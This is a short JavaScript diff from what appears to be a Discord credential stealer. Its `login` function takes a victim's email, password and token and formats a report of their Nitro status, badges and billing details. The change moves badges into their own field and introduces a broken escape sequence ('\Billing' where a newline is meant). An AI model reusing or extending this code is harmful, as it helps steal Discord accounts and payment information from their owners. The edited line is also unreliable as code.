@@ -675,8 +675,13 @@ const login = async (email, password, token) => {
             inline: true,
           },
           {
+            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            value: `${badges}`,
+            inline: true,
+          },
+          {
             name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            value: `Nitro Type: **${nitro}**\Billing: **${billing}**`,
             inline: false,
           },
         ],
